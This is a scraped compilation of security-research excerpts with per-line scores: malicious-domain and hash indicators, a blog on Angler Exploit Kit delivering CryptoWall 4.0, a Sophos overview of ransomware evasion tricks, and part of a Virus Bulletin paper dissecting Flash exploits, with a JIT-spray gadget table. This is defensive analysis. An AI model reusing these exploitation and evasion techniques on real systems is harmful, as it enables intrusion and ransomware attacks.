find-and-go.com – 78.47.4.178
Known to have responded to the same IP (188.116.34.246) are also the following malicious domains:
hxxp://www1.a36p7sillle3u8.4pu.com
hxxp://www1.a8ob5zb0gl0ci3.4pu.com
hxxp://www1.azpbn5279isyhovf5.4pu.com
hxxp://www1.b-2wx8s0z64i30k2j.4pu.com
hxxp://www1.d0okhcwq9mt1lupg3.4pu.com
hxxp://www1.e6nsivn331lw8.4pu.com
hxxp://www1.evz4qr6.4pu.com
hxxp://www1.ftmfuugbx3hj13.4pu.com
hxxp://www1.g3buqxs3.4pu.com
hxxp://www1.gtyg4h3.4pu.com
hxxp://www1.h2qxs1vj3x73w0.4pu.com
hxxp://www1.hknbyl6lbm18-2.4pu.com
hxxp://www1.i-2kf6l3i.4pu.com
hxxp://www1.i-pf8jnyhg6tn43.4pu.com
hxxp://www1.iwywekgu03rpgvzw4.4pu.com
hxxp://www1.j1akhhmw3rzjdcvf.4pu.com
hxxp://www1.j5slm5tom0yr9.4pu.com
hxxp://www1.jccydfg38zi34.4pu.com
hxxp://www1.jxka0hpqxthfm2.4pu.com
hxxp://www1.k78xp1x3.4pu.com
hxxp://www1.l7f5rmwvixm01r.4pu.com
hxxp://www1.ltb8i8sy66i5.4pu.com
hxxp://www1.myf48ql3.4pu.com
hxxp://www1.n82dj5qko2qe2q.4pu.com
hxxp://www1.olf4wmrg6toj6.4pu.com
hxxp://www1.p-76pxg3d.4pu.com
hxxp://www1.pjpgqbu1.4pu.com
hxxp://www1.px0wgrpg3ox769.4pu.com
hxxp://www1.px5qhf32.4pu.com
hxxp://www1.q-3bxzjy6qh9s6gve7.4pu.com
hxxp://www1.q9ux2132yf4u29wt.4pu.com
hxxp://www1.qnilrhnnny6go9.4pu.com
hxxp://www1.s-0natmmjzkqhy7.4pu.com
hxxp://www1.sl5gn3q6g75f8.4pu.com
hxxp://www1.sus3cpv6c0if6.4pu.com
hxxp://www1.sxeyw56ov0qyxtir-5.4pu.com
hxxp://www1.szk0zxdsfy72f3.4pu.com
hxxp://www1.tbt2r99ldyrr6.4pu.com
hxxp://www1.ur8sc24ojzyjr5.4pu.com
hxxp://www1.y48939gqmhrhjw.4pu.com
hxxp://www1.y6vymtqeg345cg.4pu.com
hxxp://www1.y7odtnqghhxziqjv.4pu.com
hxxp://www1.yec2nmr3.4pu.com
hxxp://www1.zk56z207.4pu.com
hxxp://www1.ztrazr0uggov1.4pu.com
hxxp://www2.e0nn25vfmhyreuvtc.apfi.biz
hxxp://www2.nxzdez09py3jv6.apfi.biz
hxxp://www2.p8ipv5zy5iiyt4.apfi.biz
hxxp://www2.q4sji17b.apfi.biz
hxxp://www3.a8c798u76egdul.4pu.com
hxxp://www3.d4kzsrl9f9t4-3.4pu.com
hxxp://www3.flv5yvarxot5.4pu.com
hxxp://www3.g-3biuiylzma2hft.4pu.com
hxxp://www3.hotzofix.kjyg.com
hxxp://www3.j9hdbwok.4pu.com
hxxp://www3.k3dfewr00vok.4pu.com
hxxp://www3.p0k8oz7.4pu.com
hxxp://www3.q3bxxws9ispsz.4pu.com
hxxp://www3.t3rk5zajpzpm4i.4pu.com
hxxp://www3.u-6zklvj2w66448oy9.4pu.com
hxxp://www3.vxqq241.4pu.com
hxxp://www3.xkdav1z3.4pu.com
Detection rates for the malicious scripts, dropped malicious files:
MD5: fe0e411c124ae75dad81f084244098c3 – detected by 1 out of 48 antivirus scanners as Mal/FakeAvJs-A
MD5: 89821fa040ddaa7e3c0c6e250cd67818 – detected by 9 out of 48 antivirus scanners as HEUR:Exploit.PDF.Generic; Exploit:Win32/Pdfjsc.AKB
MD5: b458e58e99d9464d931086e9d9c77501 – detected by 9 out of 47 antivirus scanners as Script/PDF.Exploit; HEUR_PDFJS.STREM
MD5: 2ec944c70459c55280ece012224cfe66 – detected by 9 out of 46 antivirus scanners as Trojan.Script.Heuristic-pdf.gutwr
MD5: e892136518ab2a4ca0e76bf8973d3fc5 – detected by 9 out of 46 antivirus scanners as Exploit:Win32/Pdfjsc.AKB
MD5: b4113f99a2c68f7e051b351a846e1886 – detected by 3 out of 46 antivirus scanners as TTF:CVE-2011-3402 [Expl]; Exploit.Win32.CVE-2011-3402.a
Webroot SecureAnywhere users are proactively protected from these threats.
",0.01522274624277875
An Early Christmas Present Exploits CVE-2015-8446 and Drops CryptoWall 4.0,0.007975588283141932
"Today, we came across a website providing free Christmas graphics along with an early but unwanted Christmas present. The website christmas-graphics-plus[.]com is injected with malicious code that leads users on a virtual sleigh ride to Angler Exploit Kit (EK) and drops the new CryptoWall 4.0 ransomware. If you were to visit this grotto, then all of your documents would be encrypted and held to ransom - including your Christmas card address book. The real Nightmare Before Christmas.",0.01288113534030666
"Raytheon|Websense® customers are protected against the threat of this Christmas stealing Grinch via real-time analytics in our Advanced Classification Engine (ACE), at multiple stages of attack:",0.008342121689886683
Stage 2 (Lure) - ACE identified the malicious code injected into the compromised website.,0.011018233481159823
Stage 3 (Redirect) - ACE identified the malicious redirect staging website.,0.010707889798129533
Stage 4 (Exploit Kit) - ACE identified Angler EK and prevented exploits from getting to the customer's machine.,0.011363218084440518
Stage 6 (Call Home) - ACE identified and prevented the CryptoWall 4.0 command-and-control (C&C) traffic.,0.015048955991732504
Compromised Website,0.009962110070377728
"The website that was compromised in this attack is christmas-graphics-plus[.]com which provides free Christmas graphics for anybody to use, and is of course popular at this time of year.",0.015398649090758942
"We believe the site was compromised on or around the 6th November 2015.  SimilarWeb shows how the popularity has increased in the lead up to Christmas (see below).  We estimate that in the intervening time, up to 60,000 victims may have been targeted by this attack:",0.016834885348262607
"The site is injected with an HTML iFrame that leads to a malicious Traffic Direction System (TDS) which determines whether or not the user should be sent on to more malicious code. Factors in determining this include: browser User-Agent, IP address and referring website. For example, somebody using Internet Explorer on an IP address that has not been seen before is considered a good candidate, whereas a user browsing from Google Chrome might not be targeted at all.",0.011877974918713896
Exploit Kit & CryptoWall 4.0,0.008599878606315725
Here is how the attack works in the background:,0.008833949406773178
"The iFrame leads to the TDS which then sends us on to an Angler Exploit Kit landing page. This landing page determines which vulnerabilities are likely to be present on our system and then decides on an exploit to target one of these vulnerabilities (previously blogged). In our case, the only vulnerability that was exploitable on our system was in our intentionally outdated Adobe Flash Player version 19.0.0.245. This vulnerability (CVE-2015-8446) is the newest Flash Player exploit in the wild, which was recently reported by Kafeine on his blog.",0.010865429763229684
"Once the Flash Player exploit successfully gained a foothold on our system, it downloaded the CryptoWall 4.0 ransomware from the Angler EK server. This ransomware is newer version of the CryptoWall malware (previously version 3.0), which now randomises filenames as well as encrypting most of the documents found on a machine. After our files were encrypted, we were then requested to pay 500 USD to get the files back.",0.012049703519946608
"Of course, we didn't pay the ransom because we were running the malware on a virtual machine with no important files on and besides, we have spent all of our money on Christmas presents already.",0.019512506852389144
Summary,0.009602684635656611
"Attackers are becoming increasingly intelligent, choosing to compromise websites that they know will be popular during holidays and special occasions. Without adequate protection or updates to your software, you remain particularly vulnerable to these sorts of attacks which will occur in the background and do not require any user interaction.  Remember: software updates are for life and not just for Christmas, so make sure you are always up to date!",0.012907587981330182
"Happy Holidays!
",0.014804470698667083
The realities of ransomware: The evasion arms race,0.011571560024504324
Behavioral shifts changed the ransomware landscape as criminals challenge defenses,0.010386557777165573
"Written by
Andrew Brandt",0.009442099916216584
"August 04, 2020",0.00947127364418665
SophosLabs Uncut evasion Lockbit Netwalker RobbinHood Snatch techniques The realities of ransomware WastedLocker,0.012861520736310417
"Ransomware attacker tactics have shifted – sometimes drastically – over the past ten months. In order to evade detection by increasingly effective endpoint security, nearly every attack involves a live engagement on the part of one or more attackers, who first surveil and inventory the target’s network and then focus their attention on shutting down or disabling various protective layers. These interactive sessions have become de rigeur in virtually all successful attacks against well-defended targets.
Over the same time period, the average ransom demand amounts also increased, and criminals expanded their attack portfolio to include the theft of highly sensitive information stolen from the target’s network, usually done at an early phase of the attack. This increases the chances a target would pay a ransom even if they have perfect backups and could restore from those backups immediately.
These two factors – the need to evade detection, and the need to strengthen the criminal’s hand in ransom negotiations – have been the dominant factors driving the most dramatic behavior changes, some of which we’ll discuss in this article. They also indicate the increasingly strenuous degree of effort it now requires to pull off a successful attack, a positive sign that the work defenders do has measurable effect on the attackers’ workloads.
What follows are an unscientifically chosen list of some of those escalations we found most interesting. We think these indicate a level of frustration on the part of the ransomware criminals at their inability to terminate or disable these security controls.",0.017443761442342498
"Unsafe Mode
In the fall of 2019, a ransomware named Snatch began doing something we don’t normally see happen during ransomware attacks: The infected computers rebooted into Windows Safe Mode, then began encrypting their hard drive.
The trick with Safe Mode in Windows is that it is designed to run with a minimal set of drivers and programs running in order to troubleshoot software problems. Booting into Safe Mode can inhibit endpoint protection, as that protection normally isn’t operational in Safe Mode.",0.014737731452844627
"There are certain situations where a PC needs a specific driver or file to run, even during Safe Mode, in order to do something critical (for example, have a working display). Snatch unexpectedly took advantage of this intentional feature of Safe Mode. During its infection process, the malware sets the registry keys that need to be there in order to run a particular file in Safe Mode. It plants its payload (the encrypting component), points the registry keys at it, and reboots the machine.
When the computer comes back up in Safe Mode, with the endpoint protection not loaded, the ransomware can launch its encrpytion payload and proceed to seal up key files on the hard drive unimpeded.
Abusing Exploitable Drivers
Retrospective analysis of attacks by a ransomware known as Robbinhood revealed that the attackers installed an otherwise benign third-party device driver in order to leverage a vulnerability in that driver. The vulnerable driver provided a stepping stone to the rest of the attack.
In the case of the attacks we analyzed, the attackers behind Robbinhood loaded a long-disused motherboard driver digitally signed by Gigabyte, the hardware manufacturer. Recent updates to Windows 10 mean that only these kinds of digitally signed drivers can run under normal circumstances.
The attackers use the Gigabyte driver, ironically, to turn off this feature in Windows that prevents the installation of hardware drivers that haven’t been cryptographically signed. Gigabyte withdrew the driver from the public several years ago and replaced it with newer software that isn’t vulnerable to the same types of abuse. But the Robbinhood operators found a copy and used it anyway.
RobbinHood’s code included a “SuperKillFile” command aimed at shutting down a wide variety of security products
Once RobbinHood disables this Driver Signature Enforcement feature, the attackers then deliver yet another driver (this one unsigned) to the infected computer. The malware uses this second driver to load itself at an operational level low enough that, the attackers believed, they were able to make an end-run around endpoint protection tools. Using the cover of this driver, the Robbinhood attackers attempted to either terminate or hobble a large number of files and processes associated with a wide variety of security software.
All this effort took place before the ransomware begins encrypting files on the computer.
Extortion becomes an important secondary revenue stream
Several ransomware gangs have begun to leverage their presence on an enterprise network to steal sensitive corporate data at an early stage of the attack. Later, the attackers extort the victims with the threat of releasing of this stolen information to the public. Maze, REvil/sodinokibi, and Lockbit ransomware all engage in this secondary method of victimizing their targets.
As novel ransomware tends to appear at a regular pace, we’ve observed that most ransomware creators who launch a new ransomware family go through a similar set of growth stages over the first 6-9 months of operation, slowly escalating the feature set to incorporate a variety of techniques the attackers use to establish their persistence and move undetected within the network. Extortion is just the latest additional behavior we see from the more mature ransomware families.",0.018954811567728047
"Lockbit further thwarts analysis by not only deleting its own executable binaries, but also overwriting the space occupied by those files on the hard drive so they aren’t recoverable using data recovery software. It also had a long list of software it tries to terminate, including some programs with no security function: The malware simply wanted to make sure these programs were closed so any open documents could be overwritten more effectively during the encryption phase.
A segment of Lockbit ransomware’s code that attempts to kill security tools
When in doubt, bring your own computer
One ransomware evasion technique that really stood out was attempted by Ragnar Locker: The malware could not perform its encryption while Intercept X was loaded, so the attackers built a headless Windows image for a VirtualBox hypervisor, and put the VM on every box they wanted to attack.
It was a devious ploy, since it appeared that any actions taken by the ransomware running inside the guest operating system had been taken by the process running the hypervisor. Since this is a trusted application, endpoint protection didn’t immediately kick in when the attackers executed all their commands from inside the VM guest.",0.013366386447932865
"The virtual machine was comparatively huge, with an installer of more than 122MB, given that ransomware binaries aren’t usually more than a few MB in size. This was a real chonk. The attackers bundled an installer for an old copy of VirtualBox and the guest operating system disk image into an MSI file then tried to download a copy and launch it on every infected endpoint.
Only when the virtual environment was set up did the malware begin attempting to prepare its environment and then begin encrypting the hard drive. Initially, it appeared that the trusted VirtualBox process was the origin of the ransomware’s file encrypting behavior on the host computer, which was confusing for a number of reasons.
An increasing use of open source or public tools (and a growing library of exploits)
Discovering the malware repository used by the attackers behind the Netwalker ransomware gave us a lot of insight into the planning and technique required to carry out an attack. One thing it revealed was just how many free or open source tools the attackers needed to use throughout the attack.",0.011605109407359926
"The attackers’ library contained a comprehensive set of tools used to perform reconnaissance on targeted networks; privilege-elevation and other exploits against Windows computers; and utilities that can steal, sniff, or brute-force their way to valuable information (including Mimikatz, and variants called Mimidogz and Mimikittenz, designed around avoiding detection by endpoint security) from a machine or network.
We also found a nearly complete set of the Microsoft SysInternals PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies’) endpoint security and antivirus tools from a computer.
Once inside the network of their target, the attackers apparently use the SoftPerfect Network Scanner to identify and create target lists of computers with open SMB ports, and subsequently may have used Mimikatz, Mimidogz, or Mimikittenz  to obtain credentials.
The files we recovered also revealed their preferred collection of exploits. Among them, we found variations on the EternalDarkness SMBv3 exploit (CVE-2020-0796), a CVE-2019-1458 local privilege exploit against Windows, the CVE-2017-0213 Windows COM privilege escalation exploit published on the Google Security Github account, and the CVE-2015-1701 “RussianDoll” privilege escalation exploit.
What happens in memory stays in memory
This year’s outbreaks of the WastedLocker ransomware brought attention to this newcomer. The malware has already been implicated in some serious attacks, including against GPS device manufacturer Garmin, who reportedly paid a hefty ransom in order to re-enable business operations. WastedLocker has taken a different approach to the ransomware detection-evasion playbook by performing most of its malicious operations within volatile system memory. The technique is called memory mapped I/O.
This behavior has some benefits. With “traditional” ransomware, the malware’s behavior is observable because a binary executable makes a large number of file reads and writes as it encrypts the victim’s important data. Behavioral detection engines that look for this type of unusual activity would otherwise alert the user and/or halted the operation, limiting the damage. Because WastedLocker reduces the number of detectable reads and writes by a significant percentage, it may fall below the thresholds that govern suspicious activity in some behavioral detection rules.
In addition, WastedLocker takes advantage of an unintended consequence of how Windows manages memory, using a component called the Cache Manager. The Cache Manager is a kernel component that sits between the file system and the Memory Manager. The Memory Manager keeps an eye on memory that has been modified (known as “dirty pages”).
If a process encrypts the mapped memory, the Memory Manager knows which pages need to be written back to disk. This writing is done by the Cache Manager’s “Lazy Writer” component; Dirty pages are allowed to accumulate for a short time, and are then flushed to disk all at once, reducing the overall number of disk I/O operations.",0.015587487021832769
"As a secondary unintended consequence of this, the writing of the modified files from their “dirty pages” back to the filesystem is done in the context of the system (PID 4), rather than the ransomware process, which then further complicates behavioral detection. After all, nobody wants to cause a victim’s computer to crash because an antimalware utility decided that the operating system itself was harming the computer. This technique also can hamstring less well qualified behavioral detection.
Prevention is the best defense
With all of these innovations in such a short period of time, it’s not hard to see why ransomware has been going through a renaissance. At the root of many, if not most, ransomware infections is the core issue that plagues so many organizations: A lack of due diligence and effort made towards reducing the attack surface available to malware. We’ve summed up many of these in the related article Ransomware attacks from the victim’s perspective.
If you work in IT security, your organization is relying on you to close the most obvious loopholes and back doors into the network. Basic PC hygiene, including installing all the latest patches, shutting down Remote Desktop entirely (or putting it behind a VPN), and applying multifactor authentication to services hosting the most sensitive data in the organization are just some of these fundamental steps you can take to protect yourself and your network today. If endpoint protection tools are the metaphorical net below the High Wire Act, applying patches and shutting down unnecessary holes in the firewall are the daily practice routines that will keep you out of the net when it matters most.",0.013498644851582586
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"VB2014 paper: Ubiquitous Flash, ubiquitous exploits, ubiquitous mitigation
2015-01-01",0.010230004829881123
"Chun Feng
Microsoft
,
Australia",0.009765346097437066
"Elia Florio
Microsoft
,
USA
Editor:
Martijn",0.009093329226264824
"Grooten
Abstract
Thanks to the ubiquity of Adobe Flash Player, Adobe Flash Player vulnerabilities have become a major target for attackers who want to deliver attacks from web pages. In 2014, some new exploits appeared, targeting two vulnerabilities (CVE-2013-5330 and CVE-2014-0497) in a new feature of Adobe applications – domain memory opcode (or Alchemy opcode). In their VB2014 paper, Chun Feng and Elia Florio analyse the technical details of exploits using these vulnerabilities. They unveil some interesting tricks used by these exploits to make the attacks more reliable and stealthy, and discuss the malware components distributed by the exploits.
Copyright © 2015 Virus Bulletin",0.014383432168286747
"Abstract
According to Adobe, Adobe Flash Player reaches ‘over 1.3 billion people across browsers and OS versions with no install’ [1]. Hence, Adobe Flash Player vulnerabilities have become a major target for attackers who want to deliver attacks from web pages, along with security researchers in public contests such as pwn2own, where the value of a Flash zero-day vulnerability starts at around $70,000 [2], [3].
Since 2012, we have seen a small increase in the number of Flash vulnerabilities exploited in real attacks and for malicious intent [4]. The fact that these vulnerabilities are quite different – ranging from canonical heap and integer overflow to type/object confusion and use-after-free (UAF) vulnerabilities – proves that attackers are actively looking into Flash code to find weaknesses that can be abused to execute malicious code.
In particular in 2014, we have seen some new exploits which target two vulnerabilities (CVE-2013-5330 and CVE-2014-0497) in a new feature of Adobe applications – domain memory opcode (also known as Alchemy opcode).
This paper analyses the technical details of exploits using CVE 2013-5330 and CVE-2014-0497. It unveils some interesting tricks used by these exploits to make the attacks more reliable and stealthy, such as improved leaked gadgets using a just-in-time (JIT) spray technique. The malware components distributed by these exploits, namely Win32/Lurk and Win32/Siromost, will also be discussed.
Fortunately, Adobe has introduced changes in Flash designed to break JIT spray techniques, and Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) can provide some help in mitigating these and other memory corruption exploits. Adobe’s changes and EMET both attempt to break some of the exploitation techniques used by attackers, and provide some degree of protection even before the vendor has released a patch. This paper will indicate how EMET can be used successfully to mitigate similar memory corruption exploits, and what mitigations can be more or less effective against these attacks.",0.015438967105499524
"1. Introduction
Adobe Flash Player is a popular piece of free software which can run ShockWave Flash (SWF) files – an Adobe Flash file format used for multimedia, vector graphics and ActionScript. Adobe Flash Player can be used to execute rich Internet applications, including the delivery of console-quality games to the web browser and the streaming of high-quality video and audio content. According to Adobe, Adobe Flash Player reaches ‘over 1.3 billion people across browsers and [operating system] versions with no install.’ [1]
Adobe Flash Player can run either from a web browser (as a web browser plug-in) or as a standalone application. The SWF file format supported by Adobe Flash Player can be generated from Adobe products, such as Adobe Flex SDK and Adobe Flash Builder. Developers can create SWF files using ActionScript, a script language based on ECMAScript.
Due to the high prevalence of Adobe Flash Player, attackers have continuously been exploiting the vulnerabilities in the player or leveraging malicious SWF files to deliver attacks. Malicious SWF files are crafted by the attackers and hosted on malicious websites, and the attackers inject malicious scripts into benign websites to redirect to their malicious websites. Users will be infected if they visit these compromised, benign websites with a vulnerable version of Adobe Flash Player.
The remainder of this paper is organized as follows:
Section 2 discusses domain memory opcode (Alchemy opcode) – a new feature introduced in Adobe Flash Player version 11.
Sections 3 and 4 analyse two domain memory opcode related exploits which exploit the CVE-2013-5330 and CVE-2014-0497 vulnerabilities.
Section 5 explains how a malicious SWF file can also be used as a helper file to exploit vulnerabilities in Internet Explorer (as seen in attacks that exploit the CVE 2014 1776, CVE 2014-0322 and CVE-2013-3163 vulnerabilities).
Section 6 presents the mitigation of these attacks from both Adobe and Microsoft.
Section 7 provides a conclusion and outlines future work.",0.020702576797509975
"2. Domain memory opcode (Alchemy opcode)
The history of domain memory opcode dates back to 2008, when Adobe released ‘Project Alchemy’ on the Adobe Labs website [5]. Alchemy allows users to compile C and C++ code into ActionScript libraries (AVM2). In 2012, Adobe released domain memory as a premium feature of Adobe Flash Player (thus requiring a separate licence from Adobe). This feature provides fast memory access to ‘domain memory’. In late 2012, Project Alchemy became the Flash Runtime C++ Compiler (FlashCC) [6]. In 2013, Adobe announced that ‘the Flash C++ Compiler (FlashCC) has been contributed to open source as CrossBridge and will be delivered through GitHub’ [7].
Domain memory opcodes supported by the Adobe Flash Player are listed in Table 1.
Opcode
Comment
li8
Load 8-bit integer
li16
Load 16-bit integer
li32
Load 32-bit integer
lf32
Load 32-bit float
lf64
Load 64-bit float
si8
Store 8-bit integer
si16
Store 16-bit integer
si32
Store 32-bit integer
sf32
Store 32-bit float
sf64
Store 64-bit float
sxi1
Signed extend 1-bit integer to 32 bits
sxi8
Signed extend 8-bit integer to 32 bits
sxi16
Signed extend 16-bit integer to 32 bits
Table 1. Domain memory opcodes. These opcodes provide fast read/write access of ByteArray.
Figure 1 shows an example access of ByteArray with domain memory opcodes.
Figure 1. Example code snippet using domain memory opcodes.
To use the domain memory opcodes, developers need to use ActionScript Compiler (ASC) 2.0, since ASC 1.0 does not directly support these opcodes. Domain memory opcodes are defined as package-level functions inside package avm2.intrinsics.memory (see Figure 2).
Figure 2. The definition of ‘domain memory opcode’.
ASC 2.0 will automatically replace these ‘intrinsic’ function calls with the equivalent domain memory opcodes listed in Table 1 [8].",0.021415320646115177
"3. Analysis of CVE-2013-5330 exploit
Adobe released security updates for CVE-2013-5330 on 12 November 2013 [9]. Versions of Adobe Flash Player for Windows up to and including 11.9.900.117 are affected by this vulnerability.
A bug in Adobe Flash Player causes a failure in memory range validation for domain memory op-codes li*/si*. Though Adobe Flash Player does validate the memory range for li*/si* instructions, there is a logic error in the function that performs the range check. An attacker can craft a SWF file with the ActionScript code shown inFigure 3 to trigger this vulnerability.
Figure 3. ActionScript trigger code.
In this ActionScript expression, two op_li32 instructions are ‘anded’ together: the first op_li32 is legal, whereas the second is illegal since index -248 is out of bound. However, due to a logic error in the function, the second li32 does not cause a runtime error in a vulnerable version of Adobe Flash Player. As a result, this vulnerability allows the attacker to use crafted li*/si* instructions to read/write an arbitrary memory location, immediately giving the attacker two very powerful exploitation ‘primitives’ that allow them to read/write process memory without the need for sophisticated tricks to neutralize unwanted side effects of typical memory corruption bugs (such as overflows and UAF).
The first exploit sample for CVE-2013-5330 (SHA1: 1514F6F59CE00BD98493C1AC3EED7BF86CB5A4BE) was observed in the wild by security researchers [10] on 31 January 2014 (more than two months after Adobe had released the patch for it). The sample was distributed by a common exploit kit (unnamed by the researchers) as a SWF file protected with the obfuscator SecureSWF. The sample has been designed as a ‘one-stop’ attack: it contains the vulnerability’s trigger, the shellcode generator, and an encrypted PE file [11].
The exploit sample sprays the heap with an Object type and makes sure the domain memory ByteArray data starts immediately after the sprayed Object types (Figure 4). It then uses two successive li32 instructions to trigger the vulnerability so it can access the out-of-bound memory. In this case, it uses negative offsets to access the memory backwards and successfully overwrites the VTABLE (virtual table) for the Object. In the new VTABLE, offsets 0x48–0x64 contain the new virtual function pointer (Figure 5), so the virtual function pointer for MethodEnv::getpropertylate_i() is redirected to the controlled address. Later, when the ActionScript tries to access the object, the virtual function MethodEnv::getpropertylate_i() is called, and control is transferred to the controlled address.
Figure 4. CVE-2013-5330 heap spray memory layout.
Figure 5. The fake VTABLE used by the CVE-2013-5330 exploit.
Unlike other Adobe Flash exploit samples, which usually transfer control to the return oriented pro-gramming (ROP) gadgets built from an Adobe Flash Player DLL file in order to bypass data execution prevention (DEP), this sample transfers code to the JIT spray gadgets instead.
The ActionScript uses some consecutive local variant assignments to achieve the JIT spray (Figure 6). The code generated by the Adobe Flash Player JIT compiler is depicted in Figure 7.
Figure 6. ActionScript for JIT spray.
Figure 7. JIT code generated from local variable assignments.
When the bytes generated by the JIT compiler are executed from offset 6, the mov instructions are no longer mov instructions. Instead, they become JIT gadgets (Table 2). These JIT gadgets make up a call to VirtualProtect(), which makes the shellcode memory executable. Note that the exploit won’t work on Flash versions higher than 11.8, which break the generation of these JIT gadgets.
JIT-generated code
Description
90    nop
90    nop
eb06  jmp  0ca3d8b1",0.019528049663395053
"60    pushad
9     nop
eb06  jmp  0ca3d8bb",0.0105929593290639
"8bd   mov  ebx,esp
eb06  jmp  0ca3d8c5",0.010436873403001146
";save stack pointer in EBX
8b21  mov  esp,dword ptr [ecx]
eb06  jmp  0ca3d8cf",0.012433128248925063
";stack-pivoting
;ESP -> heap object controlled by attacker
44    inc  esp
44    inc  esp
eb06  jmp  0ca3d8d9",0.010336305467448237
"44    inc  esp
44    inc  esp
eb06  jmp  0ca3d8e3",0.010797974216526285
";add +4 to ESP
6a7f  push 7Fh
eb06  jmp  0ca3d8ed",0.01200640151329846
"58    pop  eax
90    nop
eb06  jmp  0ca3d8f7",0.010899080267976258
"d1c0  rol  eax,1
eb06  jmp  0ca3d901",0.011014941456664706
"d1c0  rol  eax,1
eb06  jmp  0ca3d90b",0.011074724880331677
";at the end of this EAX=0x1FC
03e0  add  esp,eax
eb06  jmp  0ca3d915",0.01160898369681862
";need to add 0x200 to ESP to find the correct offset that will point the stack to the attacker’s data
58    pop  eax
90    nop
eb06  jmp  0ca3d91f",0.013884042312412248
";EAX is popped from the stack, attacker has placed an API address here
55    push ebp
90    nop
eb06  jmp  0ca3d929",0.010888170920961837
";VirtualProtect copied prologue #1
8bec  mov  ebp,esp
eb06  jmp  0ca3d933",0.012857704194798592
";VirtualProtect copied prologue #2
ffe0  jmp  eax
eb06  jmp  0ca3d93d",0.011610088122045892
"EAX=kernel32!VirtualProtectStub+0x5
Table 2. JIT spray gadgets.
The control is then transferred to shellcode memory (which is now executable). Interestingly, the shellcode is only 140 bytes long (refer to the Appendix for the shellcode) – it doesn’t contain the code to resolve the API addresses. Instead, the API addresses are resolved by the ActionScript (see Figure 8 – the placeholders for the API addresses are marked in red). This trick of performing API resolutions in scripting languages (for example, ActionScript, JavaScript or VBScript) instead of native code is used to make the shellcode stealthier and to avoid behaviour that may trigger the dynamic analysis features of security products (for example, EMET Export Address Filtering (EAF) mitigation) [12]. The shellcode simply drops a DLL file (already decrypted by ActionScript) to the %temp% directory and loads it with a call to LoadLibrary().
Figure 8. The placeholders in shellcode.
The dropped PE file (SHA1: 05446C67FF8C0BAFFA969FC5CC4DD62EDCAD46F5) is detected as TrojanSpy:Win32/Lurk [13]. It registers itself as a PNG image filter (CLSID: A3CCEDF7-2DE2-11D0-86F4-00A0C913F750) so it will be loaded when the web browser needs to decode a PNG image file. Win32/Lurk forwards the exports to the original PNG filter (pngfilt.dll) to make sure the PNG image can be decoded correctly. Win32/Lurk downloads a PE file from a remote server and injects the PE file into the web browser process.",0.01661174279203348
"4. Analysis of CVE-2014-0497 exploit
Adobe released security updates for CVE-2014-0497 on 4 February 2014. Versions of Adobe Flash Player for Windows up to and including 12.0.0.43 are vulnerable [14]. This vulnerability was introduced with the fix in November for CVE 2013-5330, and thus lasted for a very short time and for a limited number of versions [15].
Similar to CVE-2013-5330, certain versions of Adobe Flash Player fail to validate the memory range for li*/si* instructions. An attacker can use the ActionScript code snippet shown in Figure 9 to bypass the memory range validation.
Figure 9. The exploit code snippet for CVE-2014-0497.
The first CVE-2014-0497 exploit sample was observed in the wild in February 2014, and Adobe promptly responded with an out-of-band patch [14]. Similar to the CVE-2013-5330 exploit sample, this sample also contains a vulnerability trigger, shellcode generator, and an encrypted PE file [16]. The exploit sample successfully bypasses the memory range validation and is then able to access out-of-bound memory.
Initially, the bug is used to leak a pointer into the Flash module to bypass address space layout randomization (ASLR); curiously enough the attacker did not take full advantage of the read/write primitive to dynamically discover gadgets in memory; instead, the exploit contains a large set of hard-coded gadget addresses for almost 20 different Flash versions. These ROP gadgets make up a call to VirtualProtect() to make the shellcode memory region executable and bypass DEP protection. When the ROP chain is prepared, the exploit uses the write primitive to overwrite a virtual function pointer in VTABLE and successfully transfers control to the ROP chain function. The function starts with stack pivot ROP gadgets found in a Flash Player DLL and ends with a transfer of control to the shellcode via a jmp esp instruction.
The shellcode drops a PE file (decrypted by ActionScript) as %temp%\a.exe and executes it. The dropped PE file is detected as TrojanDownloader:Win32/Siromost.A, which simply downloads another PE file from a remote server and then executes it [17].",0.011896906052957346
"5. Analysis of Flash-based exploitation for Internet Explorer vulnerabilities
A malicious SWF file can not only be used to exploit the vulnerability in Adobe Flash Player itself, but also used as a helper to exploit the vulnerability in a web browser.
Since the Internet Explorer (IE) process and the Adobe Flash plug-in share the same address space, it is possible for the attacker to use an IE-specific vulnerability to corrupt data and objects used by Flash. This exploitation technique has been observed in real attacks in at least three different IE exploit cases: CVE-2013-3163, CVE-2014-0322 and, recently, CVE 2014-1776. In these three cases, apart from some minor modifications and improvements, the attacker was able to transform a UAF memory corruption into a basic memory corruption overwrite primitive which, when applied to certain Flash objects, can finally become a powerful read/write anywhere exploitation primitive, as seen in Table 3.
IE vulnerability
Corruption primitive used against Flash objects
SHA1 of corresponding Flash sample
CVE-2013-3163
or dword ptr [esi+8],20000h
81fe2ae7a685014cafc12c3abbcc5ffc9ab27b7e
CVE-2014-0322
inc dword ptr [eax+10h]
910de05e0113c167ba3878f73c64d55e5a2aff9a
CVE-2014-1776
mov [esi+42h], cx
8dd01c0e60e3cedac0b3914e324c39d8ceb74741
Table 3. Corruption primitives.
The helper SWF file works as an ‘exploitation framework’ to take advantage of IE’s memory corruption bugs (and those of other browsers) and re-use them against Flash objects. This strategy presents some good advantages for attackers, as described in Table 4.
Characteristic
Considerations
Write once, re-use multiple times
The ActionScript code is maintained and improved by attackers as a project and can be applied to any browser memory corruption with some minor changes
Exploit divided into multiple pieces
Recovery of all exploit artifacts for security vendors becomes more difficult and the
IE
exploit part won’t trigger without the Flash counterpart
Obfuscation
Flash files can easily be obfuscated and protected and pose some non-trivial challenges for anti virus detection
Portability
The framework works well on multiple browsers and doesn’t require major changes to be adapted to all
IE
versions
Table 4. Advantages of SWF file helper.
